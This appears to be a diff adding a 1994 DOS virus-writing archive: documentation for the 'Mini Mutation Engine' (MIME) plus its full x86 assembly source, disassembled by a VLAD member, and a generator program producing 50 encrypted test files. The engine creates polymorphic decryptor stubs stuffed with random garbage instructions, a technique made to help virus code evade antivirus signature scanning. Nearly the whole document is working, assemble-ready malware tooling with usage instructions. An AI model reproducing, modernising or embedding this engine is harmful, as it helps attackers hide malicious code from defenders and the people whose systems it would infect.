@@ -1,0 +1,670 @@
+;---=<mime.doc>=-----------------------------------------------=<cut here>=---
+
+Mini Mutation Engine v1.0 12-01-94 ArChung Lai, Chung-Li, Taiwan
+
+Super Mini Mutation Engine: [Total length 275 bytes]
+
+[Preface:]
+	At the beginning of the year, classmate kk suddenly gave me a
+	mutation engine to play with. I felt it was a good idea, but it's 
+	too fat. After I got my credit, still nobody has a smaller
+	engine, so I wrote one of my own.  Suddenly, I feel it is so
+	tiny.  Actually, I can make it smaller by about 100 bytes or so, I
+	merely made it more fun...
+
+[parameter:]
+	extrn   mime:near, emime:near
+
+   ES:0  => store decryption routine + encrypted stuff segment (from ES:0)
+   DS:SI => point to stuff that u want encrypted (generally point to the
+	    beginning of the program)
+   CX = the length of stuff that you want encrypted (to get total
+	length via OFFSET EMIME )
+   BX = offset of decrypt routine
+
+	the length of the decryption routine made by this engine will be
+	within 150 bytes, so you merely allocate the size of memory:
+	the length of stuff that you want encrypted + the length of this
+	engine + 150 bytes or so.  (notice on TSR type)
+
+[return:]
+
+   DS:DX => decryption stuff + encrypted stuff
+	    DS:DX points to decryption stuff + encrypted stuff after return,
+	    this is convenient for the Int 21h writing function.
+   CX = the length of decryption stuff + encrypted stuff
+	It's also convenient for the Int 21h writing function.
+   Registers are preserved aside from the above registers and AX.
+
+[note:]
+
+	You don't need to disassemble it with Sourcer, I will release
+	the source code and append the associated development document for
+	DIY. This is 'cause I have never released stuff that appended
+	source code, it was modified and released once more by some
+	kids, they even modified the version.
+
+reference: 8086/8088 Microprocsssor, architecture, programming and
+	   interface tech (Chapter 3)
+;---=<mime.doc>=-----------------------------------------------=<cut here>=---
+;---=<m-gen.asm>=----------------------------------------------=<cut here>=---
+comment *
+	      MIni Mutation Engine v 1.0 [MIME] Generator
+			     Disassembly by
+			      Darkman/VLAD
+
+To compile M-GEN with Turbo Assembler v 4.0 type:
+  TASM M-GEN.ASM
+  TLINK /t /x M-GEN.OBJ MIME.OBJ
+*
+
+.model tiny
+.code
+.286
+ org   100h                              ; Origin of COM file
+
+extrn        mime:near,emime:near        ; Include MIME
+
+code:
+	     mov     ah,09h              ; Print string
+	     lea     dx,genmessage       ; DX = offset of genmessage
+	     int     21h                 ; Do it!
+
+	     lea     ax,emime+0fh        ; AX = offset of emime + 15
+	     shr     ax,04h              ; Divide by paragraphs
+	     mov     bx,cs
+	     add     bx,ax
+	     mov     es,bx               ; ES = CS + emime in paragraphs
+
+	     mov     cx,32h              ; Generate 50 examples
+createfile:
+	     push    cx                  ; Save CX at stack
+
+	     mov     ah,3ch              ; Create a file
+	     xor     cx,cx               ; Zero CX
+	     lea     dx,filename         ; DX = offset of filename
+	     int     21h                 ; Do it!
+	     xchg    ax,bx               ; Exchange AX with BX
+
+	     mov     cx,(codeend-example)
+	     lea     si,example          ; SI = offset of example
+	     xor     di,di               ; Zero DI
+	     push    bx                  ; Save BX at stack
+	     mov     bx,100h             ; BX = decryptors offset
+	     call    mime
+
+	     pop     bx                  ; Load BX from stack
+
+	     mov     ah,40h              ; Write to file
+	     int     21h                 ; Do it!
+
+	     mov     ah,3eh              ; Close file
+	     int     21h                 ; Do it!
+
+	     push    cs                  ; Save CS at stack
+	     pop     ds                  ; Load DS from stack (CS)
+
+	     lea     bx,filename+06h     ; BX = offset of second last figure
+	     inc     byte ptr [bx+01h]   ; Increase last figure
+
+	     cmp     byte ptr [bx+01h],'9'
+	     jbe     dontcorrect         ; Below or equal? Jump to dontcorrect
+
+	     inc     byte ptr [bx]       ; Increase second last figure
+	     mov     byte ptr [bx+01h],'0'
+dontcorrect:
+	     pop     cx                  ; Load CX from stack
+	     loop    createfile
+
+	     mov     ah,4ch              ; Exit to DOS!
+	     int     21h                 ; Do it!
+
+filename     db      '00000000.com',00h  ; Filename
+genmessage   db      'generates 50 mim'  ; Message to the user
+	     db      'e encrypted test'  ;    "    "   "   "
+	     db      ' files.',0dh,0ah   ;    "    "   "   "
+	     db      '$'                 ;    "    "   "   "
+
+example      proc    near                ; Example
+	     call    examplecode
+examplecode:
+	     pop     dx                  ; Load DX from stack
+	     add     dx,0ah              ; DX = offset of mimemessage
+
+	     mov     ah,09h              ; Print string
+	     int     21h                 ; Do it!
+
+	     int     20h                 ; Exit to DOS!
+
+mimemessage  db      'This is <MIME> te' ; Encrypted files message
+	     db      'st file.$'         ;     "       "      "
+	     endp
+codeend:
+
+end          code
+;---=<m-gen.asm>=----------------------------------------------=<cut here>=---
+;---=<mime.asm>=-----------------------------------------------=<cut here>=---
+comment *
+		   MIni Mutation Engine v 1.0 [MIME]
+			     Disassembly by
+			      Darkman/VLAD
+
+Garbage instructions:
+  ADC acc,imm; ADD acc,imm; AND acc,imm; CMP acc,imm; OR acc,imm
+  SBB acc,imm; SUB acc,imm; XOR acc,imm
+  ADC reg,reg; ADD reg,reg; AND reg,reg; CMP reg,reg; OR reg,reg
+  SBB reg,reg; SUB reg,reg; XOR reg,reg
+  ADC reg,mem; ADD reg,mem; AND reg,mem; CMP reg,mem; OR reg,mem
+  SBB reg,mem; SUB reg,mem; XOR reg,mem
+  DEC reg16; INC reg16
+  JA/JNBE imm8; JAE/JNC/JNB imm8; JB/JC/JNAE imm8; JBE/JNA imm8; JE/JZ imm8
+  JG/JNLE imm8; JGE/JNL imm8; JL/JNGE imm8; JLE/JNG imm8; JNE/JNZ imm8
+  JNO imm8; JNP/JPO imm8; JNS imm8; JO imm8; JP/JPE imm8; JS imm8
+  ADC reg,imm; ADD reg,imm; AND reg,imm; CMP reg,imm; OR reg,imm
+  SBB reg,imm; SUB reg,imm; XOR reg,imm
+  MOV reg,imm
+  JMP imm8
+  INT 03h; NOP; CMC; CLC; STC; CLI; STI; CLD
+
+Garbage registers:
+  AL; CL; DL; BL; AH; CH; DH; BH; AX; CX; DX; BX
+
+Garbage memory addressing modes:
+  [BX+SI]; [BX+DI]; [BP+SI]; [BP+DI]; [BX]; [SI]; [DI]
+  [BX+SI+imm8]; [BX+DI+imm8]; [BP+SI+imm8]; [BP+DI+imm8]; [BX+imm8]; [SI+imm8]
+  [DI+imm8]
+  [BX+SI+imm16]; [BX+DI+imm16]; [BP+SI+imm16]; [BP+DI+imm16]; [BX+imm16]
+  [SI+imm16]; [DI+imm16]
+
+MIME decryptor:
+  1-4 garbage instructions.
+  MOV SI,imm16; MOV DI,imm16                     (Beginning of encrypted code)
+  1-8 garbage instructions.
+  DEC [SI]; INC [DI]; ROL [SI],01h; ROR [DI],01h (Include CS: if it ain't COM)
+  1-4 garbage instructions.
+  INC SI; INC DI; ADD SI,01h; ADD DI,01h
+  1-4 garbage instructions.
+  CMP SI,imm16; CMP DI,imm16                           (End of encrypted code)
+  1-4 garbage instructions.
+  JNE imm8                                 (End of MOV SI,imm16; MOV DI,imm16)
+
+Min. decryptor size:                     17 bytes.
+Max. decryptor size:                    255 bytes.
+
+MIni Mutation Engine v 1.0 [MIME] size: 629 bytes.
+
+To compile MIME with Turbo Assembler v 4.0 type:
+  TASM /M2 MIME.ASM
+*
+
+.model tiny
+.code
+.286
+
+public       mime,emime                  ; Public procedure and label
+
+code:
+random       db      ?                   ; Random number
+onebytes:
+	     int     03h                 ; Table of one byte instructions
+	     nop                         ;   "   "   "   "        "
+	     cmc                         ;   "   "   "   "        "
+	     clc                         ;   "   "   "   "        "
+	     stc                         ;   "   "   "   "        "
+	     cli                         ;   "   "   "   "        "
+	     sti                         ;   "   "   "   "        "
+	     cld                         ;   "   "   "   "        "
+
+algorithme   db      ?                   ; Encryption/decryption algorithme
+garbageflags db      ?                   ; Garbage generation flags
+decrypt_off  dw      ?                   ; Offset of decryptor
+mov_offset   dw      ?                   ; Offset of MOV reg16,imm16
+loop_offset  dw      ?                   ; Offset of decryptor loop
+cmp_offset   dw      ?                   ; Offset of CMP reg16,imm16
+plainlength  dw      ?                   ; Length of plain code
+
+gen_immediat proc     near               ; Generate immediate
+	     inc      ah                 ; Increase AH
+random_imm:
+	     in       al,40h             ; Get random number
+	     stosb                       ; Store immediate
+
+	     dec      ah                 ; Decrease AH
+	     jnz      random_imm         ; Not zero? Jump to random_imm
+
+	     ret                         ; Return!
+	     endp
+
+gen_misc_reg proc     near               ; Generate ADC/...acc/reg,imm/reg/mem
+	     and      al,00111111b
+	     test     al,00000100b       ; Generate ADC/ADD/AND...reg,reg/mem?
+	     je       reg_dest           ; Equal? Jump to reg_dest
+
+	     and      al,11111101b
+	     stosb                       ; Store ADC/ADD/AND/CMP/OR/...acc,imm
+
+	     and      al,00000001b       ; Generate a 8-bit/16-bit immediate
+	     mov      ah,al
+
+	     jmp      gen_imm
+reg_dest:
+	     or       al,00000010b       ; Don't use memory as destination
+	     stosb                       ; Store ADC/ADD/AND/CMP...reg,reg/mem
+
+	     mov      ah,al
+	     in       al,40h             ; Get random number
+	     test     ah,00000001b       ; Reg8 as destination?
+	     je       reg8_dest          ; Equal? Jump to reg8_dest
+
+	     and      al,11011110b       ; Don't use SP/BP/DI/SI as reg16
+reg8_dest:
+	     test     al,00000100b
+	     je       sto_misc_reg       ; Equal? Jump to sto_misc_reg
+
+	     test     al,00000010b
+	     je       sto_misc_reg       ; Equal? Jump to sto_misc_reg
+
+	     or       al,00000001b
+sto_misc_reg:
+	     stosb                       ; Store ADC/ADD/AND/CMP...reg,reg/mem
+
+	     shr      al,06h             ; Shift left bit 7 and bit 6 (286)
+	     mov      ah,al
+	     cmp      ah,00              ; Don't generate immediate?
+	     je       dont_gen_imm       ; Equal? Jump to dont_gen_imm
+
+	     cmp      ah,03h             ; Don't generate immediate?
+	     je       dont_gen_imm       ; Equal? Jump to dont_gen_imm
+
+	     dec      ah                 ; Decrease AH
+gen_imm:
+	     call     gen_immediat
+dont_gen_imm:
+	     ret                         ; Return!
+	     endp
+
+gen_jump_con proc     near               ; Generate jump condition
+	     and      al,00001111b
+	     or       al,01110000b
+	     stosb                       ; Store jump condition
+
+	     mov      ah,al
+
+	     in       al,40h             ; Get random number
+	     and      al,00000011b       ; Random number between 0 and 3
+	     inc      al                 ; Increase AL
+	     stosb                       ; Store random immediate
+
+	     xchg     ah,al              ; Exchange AH with AL
+gen_onebytes:
+	     call     gen_onebyte
+
+	     dec      ah                 ; Decrease AH
+	     jnz      gen_onebytes       ; Not zero? Jump to gen_onebytes
+
+	     ret                         ; Return!
+	     endp
+
+gen_misc_imm proc     near               ; Generate ADC/ADD/AND/CMP/...reg,imm
+	     and      al,00000001b
+	     or       al,10000000b
+	     stosb                       ; Store ADC/ADD/AND/CMP/OR/...reg,imm
+
+	     mov      ah,al
+
+	     in       al,40h             ; Get random number
+	     or       al,11000000b
+
+	     test     ah,00000001b       ; ADC/ADD/...reg8/reg16,imm8/imm16?
+	     je       store_math         ; Equal? Jump to store_math
+
+	     and      al,11111011b       ; Don't use SP/BP/DI/SI as reg16
+store_math:
+	     stosb                       ; Store ADC/ADD/AND/CMP/OR/...reg,imm
+
+	     and      ah,00000001b       ; Generate a 8-bit/16-bit immediate
+
+	     call     gen_immediat
+
+	     ret                         ; Return!
+	     endp
+
+gen_mov_reg  proc     near               ; Generate MOV reg,imm
+	     and      al,00001111b
+	     or       al,10110000b
+	     xor      ah,ah              ; Zero AH
+
+	     test     al,00001000b       ; MOV reg8/reg16,imm8/imm16?
+	     je       sto_mov_reg        ; Equal? Jump to sto_mov_reg
+
+	     and      al,11111011b       ; Don't use SP/BP/DI/SI as reg16
+
+	     inc      ah                 ; Increase AH
+sto_mov_reg:
+	     stosb                       ; Store MOV reg,imm
+
+	     call     gen_immediat
+
+	     ret                         ; Return!
+	     endp
+
+gen_jmp_imm8 proc     near               ; Generate JMP imm8
+	     mov      ah,0ebh            ; JMP imm8 (opcode 0ebh)
+
+	     in       al,40h             ; Get random number
+	     and      al,00000111b       ; Random number between 0 and 7
+	     inc      al                 ; Increase AL
+
+	     xchg     ah,al              ; Exchange AH with AL
+
+	     stosw                       ; Store JMP imm8
+
+	     dec      ah                 ; Decrease AH
+
+	     call     gen_immediat
+
+	     ret                         ; Return!
+	     endp
+
+gen_onebyte  proc     near               ; Generate a one byte instruction
+	     push     bx                 ; Save BX at stack
+
+	     and      al,00000111b       ; Random number between 0 and 7
+
+	     db       8dh,1eh            ; LEA BX,imm16
+	     dw       offset onebytes    ; Offset of onebytes
+	     mov      al,cs:[bx]         ; AL = one byte instruction
+	     stosb                       ; Store one byte instruction
+
+	     pop      bx                 ; Load BX from stack
+
+	     ret                         ; Return!
+	     endp
+
+gen_garbage  proc     near               ; Generate garbage instructions
+	     inc      cl                 ; Increase CL
+next_garbage:
+	     in       al,40h             ; Get random number
+	     add      cs:[random],al     ; Add random number
+	     mov      al,cs:[random]     ; Load random number
+
+	     cmp      al,40h             ; Generate ADC...acc/reg,imm/reg/mem?
+	     jae      chk_dec_inc        ; Above or equal? Jump to chk_dec_inc
+
+	     test     cs:[garbageflags],00000001b
+	     je       chk_dec_inc        ; Equal? Jump to chk_dec_inc
+
+	     call     gen_misc_reg
+loop_garbage:
+	     loop     next_garbage
+
+	     ret                         ; Return!
+	     endp
+chk_dec_inc:
+	     cmp      al,60h             ; Generate DEC/INC reg16?
+	     jae      chk_jump_con       ; Above or equal? Jump to chk_jump...
+
+	     test     cs:[garbageflags],00000010b
+	     je       chk_jump_con       ; Equal? Jump to chk_jump_con
+
+	     and      al,01001011b       ; Don't use SP/BP/DI/SI as reg16
+	     stosb                       ; Store DEC/INC reg16
+
+	     jmp      loop_garbage
+chk_jump_con:
+	     cmp      al,80h             ; Generate jump condition?
+	     jae      chk_math_reg       ; Above or equal? Jump to chk_math...
+
+	     test     cs:[garbageflags],00000100b
+	     je       chk_math_reg       ; Equal? Jump to chk_math_reg
+
+	     call     gen_jump_con
+
+	     jmp      loop_garbage
+chk_math_reg:
+	     cmp      al,84h             ; Generate ADC/ADD/AND/CMP...reg,imm?
+	     jae      chk_mov_reg        ; Above or equal? Jump to chk_mov_reg
+
+	     test     cs:[garbageflags],00001000b
+	     je       chk_mov_reg        ; Equal? Jump to chk_mov_reg
+
+	     call     gen_misc_imm
+
+	     jmp      loop_garbage
+chk_mov_reg:
+	     cmp      al,0c0h            ; Generate MOV reg,imm?
+	     jae      chk_jmp_imm8       ; Above or equal? Jump to chk_jmp_i..
+
+	     test     cs:[garbageflags],00010000b
+	     je       chk_jmp_imm8       ; Equal? Jump to chk_jmp_imm8
+
+	     call     gen_mov_reg
+
+	     jmp      loop_garbage
+chk_jmp_imm8:
+	     cmp      al,0ech            ; Generate JMP imm8?
+	     jae      chk_gen_ones       ; Above or equal? Jump to chk_gen_o..
+
+	     test     cs:[garbageflags],00100000b
+	     je       chk_gen_ones       ; Equal? Jump to chk_gen_ones
+
+	     call     gen_jmp_imm8
+
+	     jmp      loop_garbage
+chk_gen_ones:
+	     test     cs:[garbageflags],01000000b
+	     je       no_garbage         ; Equal? Jump to no_garbage
+	     call     gen_onebyte
+no_garbage:
+	     jmp      loop_garbage
+
+gen_decrypt  proc     near               ; Generate decryptor
+	     in       al,40h             ; Get random number
+	     and      al,00000011b       ; Random number between 0 and 3
+	     mov      cl,al
+
+	     mov      cs:[garbageflags],11111111b
+
+	     call     gen_garbage
+
+	     in       al,40h             ; Get random number
+	     mov      cs:[algorithme],al ; Store cryption algorithme
+
+	     mov      bl,al
+	     mov      al,0beh            ; MOV SI,imm16 (opcode 0beh)
+
+	     test     bl,00000100b       ; Get index register
+	     je       sto_mov_r16        ; Equal? Jump to sto_mov_r16
+
+	     inc      al                 ; MOV DI,imm16 (opcode 0bfh)
+sto_mov_r16:
+	     stosb                       ; Store MOV reg16,imm16
+
+	     mov      cs:[mov_offset],di ; Store offset of MOV reg16,imm16
+
+	     mov      ax,00h             ; Temporary offset
+	     stosw                       ; Store temporary offset
+
+	     mov      cs:[loop_offset],di
+
+	     in       al,40h             ; Get random number
+	     and      al,00000111b       ; Random number between 0 and 7
+	     mov      cl,al
+
+	     mov      cs:[garbageflags],11111111b
+
+	     call     gen_garbage
+
+	     cmp      cs:[decrypt_off],100h
+	     je       dont_use_cs        ; COM file? Jump to dont_use_cs
+
+	     mov      al,2eh             ; CS: (opcode 2eh)
+	     stosb                       ; Store CS:
+dont_use_cs:
+	     mov      al,0feh            ; DEC/INC [reg16] (opcode 0feh)
+
+	     test     bl,00000001b       ; DEC/INC encryption?
+	     je       dec_inc            ; Equal? Jump to dec_inc
+
+	     mov      al,0d0h            ; ROL/ROR [reg16],01h (opcode 0d0h)
+dec_inc:
+	     stosb                       ; Store DEC/INC [reg16]
+
+	     mov      al,04h             ; INC/ROL [reg16]
+
+	     test     bl,00000010b       ; INC [reg16] or ROL [reg16]?
+	     je       inc_rol_r16        ; Equal? Jump to inc_rol_r16
+
+	     mov      al,0ch             ; DEC/ROR [reg16]
+inc_rol_r16:
+	     test     bl,00000100b       ; Source index (SI)?
+	     je       store_crypt        ; Equal? Jump to store_crypt
+
+	     inc      al                 ; Destination index (DI)
+store_crypt:
+	     stosb                       ; Store decryption index (SI/DI)
+
+	     in       al,40h             ; Get random number
+	     and      al,00000011b       ; Random number between 0 and 3
+	     mov      cl,al
+
+	     mov      cs:[garbageflags],11111111b
+
+	     call     gen_garbage
+
+	     mov      al,46h             ; INC SI (opcode 46h)
+
+	     test     bl,00001000b       ; INC reg16 increment?
+	     je       inc_add_r16        ; Equal? Jump to inc_add_r16
+
+	     mov      al,83h             ; ADD reg16,imm8 (opcode 83h)
+	     stosb                       ; Store ADD reg16,imm8
+
+	     mov      al,0c6h            ; ADD SI,imm8 (opcode 0c6h)
+inc_add_r16:
+	     test     bl,00000100b       ; Source index (SI)?
+	     je       store_incre        ; Equal? Jump to store_incre
+
+	     inc      al                 ; Destination index (DI)
+store_incre:
+	     stosb                       ; Store decryption index (SI/DI)
+
+	     test     bl,00001000b       ; ADD reg16,imm8?
+	     je       dont_sto_imm       ; Equal? Jump to dont_sto_imm
+
+	     mov      al,01h             ; ADD reg16,01h
+	     stosb                       ; Store ADD reg16,01h
+dont_sto_imm:
+	     in       al,40h             ; Get random number
+	     and      al,00000011b       ; Random number between 0 and 3
+	     mov      cl,al
+
+	     mov      cs:[garbageflags],11111111b
+
+	     call     gen_garbage
+
+	     mov      ax,0fe81h          ; CMP SI,imm16 (opcode 81h,0feh)
+
+	     test     bl,00000100b       ; Source index (SI)?
+	     je       store_comp         ; Equal? Jump to store_comp
+
+	     inc      ah                 ; Destination index (DI)
+store_comp:
+	     stosw                       ; Store CMP reg16,imm16
+
+	     mov      cs:[cmp_offset],di ; Store offset of CMP reg16,imm16
+
+	     mov      ax,00h             ; Temporary offset
+	     stosw                       ; Store temporary offset
+
+	     in       al,40h             ; Get random number
+	     and      al,00000011b       ; Random number between 0 and 3
+	     mov      cl,al
+
+	     mov      cs:[garbageflags],11110100b
+
+	     call    gen_garbage
+
+	     mov     al,75h              ; JNE imm8 (opcode 75h)
+	     stosb                       ; Store JNE imm8
+
+	     mov     ax,di
+	     sub     ax,cs:[loop_offset] ; Subtract offset of decryptor loop
+	     not     ax                  ; Calculate beginning of decrypt loop
+	     stosb                       ; Store calculated LOOP immediate
+
+	     mov     bx,di
+
+	     mov     ax,cs:[decrypt_off] ; Load offset of decryptor
+	     add     ax,di               ; Add offset of encrypted code
+	     mov     di,cs:[mov_offset]  ; Load offset of MOV reg16,imm16
+	     stosw                       ; Store offset of encrypted code
+
+	     add     ax,cs:[plainlength] ; Add length of plain code to offse..
+	     mov     di,cs:[cmp_offset]  ; Load offset of CMP reg16,imm16
+	     stosw                       ; Store length of plain code
+
+	     mov     di,bx               ; DI = offset of encrypted code
+
+	     ret                         ; Return!
+	     endp
+
+encrypt      proc     near               ; Encrypt plain code
+	     mov      cx,cs:[plainlength]
+load_plain:
+	     lodsb                       ; Load a plain byte
+
+	     test     cs:[algorithme],00000001b
+	     je       test_algo          ; Equal? Jump to test_algo
+
+	     test     cs:[algorithme],00000010b
+	     je       ror_crypt          ; Equal? Jump to ror_crypt
+
+	     rol      al,01h             ; ROL encrypt
+
+	     jmp      store_enc
+ror_crypt:
+	     ror      al,01h             ; ROR encrypt
+
+	     jmp      store_enc
+test_algo:
+	     test     cs:[algorithme],00000010b
+	     je       dec_crypt          ; Equal? Jump to dec_crypt
+
+	     inc      al                 ; INC encrypt
+
+	     jmp      store_enc
+dec_crypt:
+	     dec      al                 ; DEC encrypt
+store_enc:
+	     stosb                       ; Store the encrypted byte
+
+	     loop     load_plain
+
+	     ret                         ; Return!
+	     endp
+
+mime         proc     near               ; MIni Mutation Engine
+	     mov      cs:[decrypt_off],bx
+	     mov      cs:[plainlength],cx
+
+	     xor      cx,cx              ; Zero CX
+
+	     call     gen_decrypt
+	     call     encrypt
+
+	     mov      cx,di              ; CX = Length of decryptor + encryp...
+
+	     push     es                 ; Save ES at stack
+	     pop      ds                 ; Load DS from stack (ES)
+
+	     mov      dx,00h             ; Zero DX
+
+	     ret                         ; Return!
+	     endp
+codeend:
+
+emime        equ     $                   ; End of MIME
+
+end          code
+;---=<mime.asm>=-----------------------------------------------=<cut here>=---
